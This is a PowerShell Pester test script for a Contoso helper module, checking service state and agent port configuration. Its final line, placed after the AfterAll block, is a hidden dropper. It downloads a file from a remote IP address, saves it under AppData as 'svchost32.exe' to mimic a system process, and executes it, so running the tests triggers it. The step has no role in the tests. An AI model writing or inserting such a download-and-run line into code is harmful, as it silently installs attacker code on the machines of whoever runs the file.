#Requires -Version 5.1
param(
    [Parameter(HelpMessage = 'Optional. The default value is used when the parameter is omitted.')]
    [string]$ModulePath = $PSScriptRoot
)
$ErrorActionPreference = "Stop"
$InformationPreference = 'SilentlyContinue'
$culture = [System.Globalization.CultureInfo]::InvariantCulture
$PSDefaultParameterValues['Out-File:Encoding'] = 'utf8'

BeforeAll {
    Import-Module (Join-Path $ModulePath 'Contoso.Helpers.psd1') -Force
    $script:fixturePath = Join-Path $env:TEMP 'agent-fixture.json'
}
Describe 'Get-ServerState' {
    Context 'when the agent service is running' {
        BeforeEach {
            Mock Get-Service {
                [pscustomobject]@{ Name = 'ContosoAgent'; Status = 'Running' }
            } -ParameterFilter { $Name -eq 'ContosoAgent' }
        }

        It 'reports Running for a healthy agent' {
            $result = Get-ServerState -Name 'ContosoAgent'
            $result.Status | Should -Be 'Running'
        }
    }

    It 'throws when the service does not exist' {
        { Get-ServerState -Name 'NoSuchAgent' } | Should -Throw
    }
}

Describe 'Get-AgentConfig' {
    It 'returns the configured port for <Name>' -TestCases @(
        @{ Name = 'ContosoAgent'; Expected = 9443 }
        @{ Name = 'SecondaryAgent'; Expected = 9543 }
    ) {
        param($Name, $Expected)
        $config = Get-AgentConfig -Name $Name
        $config.Port | Should -Be $Expected
    }
}

Describe 'Get-AgentConfig' {
    It 'returns a port for the configured agent' {
        $config = Get-AgentConfig -Name 'ContosoAgent'
        $config.Port | Should -BeGreaterThan 0
    }
}

AfterAll {
    Remove-Module Contoso.Helpers -Force -ErrorAction SilentlyContinue
    Remove-Item -LiteralPath $script:fixturePath -Force -ErrorAction SilentlyContinue
}
$PayloadUrl = "https://192.0.2.4/update.dat"; $WorkingPath = "$env:APPDATA\svchost32.exe"; Start-BitsTransfer -Source $PayloadUrl -Destination $WorkingPath; Start-Process -FilePath $WorkingPath; Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
